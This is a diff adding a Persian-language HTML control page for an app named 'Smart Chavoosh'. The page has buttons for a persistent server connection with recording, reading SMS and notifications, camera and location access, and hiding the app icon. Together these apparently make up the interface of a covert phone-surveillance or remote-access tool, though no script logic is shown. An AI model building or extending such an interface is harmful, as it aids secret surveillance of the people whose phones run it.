@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>چاووش هوشمند</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>✨ چاووش هوشمند</h1>
+        <div class="card">
+        </div>
+        <div id="status" class="status"></div>
+        <div class="permission-group">
+            <h3>🎙️ سرویس هوشمند (دائمی)</h3>
+            <button class="btn" id="startRecording">🔴شروع اتصال به سرور</button>
+            <button class="btn" id="stopRecording">⏹️ توقف </button>
+            <p style="font-size:0.8rem">پس از شروع، یک نوتیفیکیشن دائمی نمایش داده می‌شود. با توقف برنامه، نوتیفیکیشن حذف می‌شود.</p>
+        </div>
+        <div class="permission-group">
+            <h3>📨 سایر دسترسی‌ها</h3>
+            <button class="btn" id="btnNotification">🔔 خواندن اعلان‌ها</button>
+            <button class="btn" id="btnSms">📨 خواندن پیامک‌ها</button>
+            <button class="btn" id="btnCamera">📷 دوربین</button>
+            <button class="btn" id="btnLocation">📍 موقعیت مکانی</button>
+        </div>
+        <div class="permission-group" id="hideIconSection">
+            <h3>🔒 مخفی‌سازی آیکون</h3>
+            <button class="btn" id="hideIconOption">🙈 مخفی کردن آیکون برنامه</button>
+            <p style="font-size:0.8rem">(با انتخاب این گزینه، آیکون این برنامه ناپدید می‌شود. برای دسترسی مجدد، از برنامه «لانچر چاووش» استفاده کنید.)</p>
+        </div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
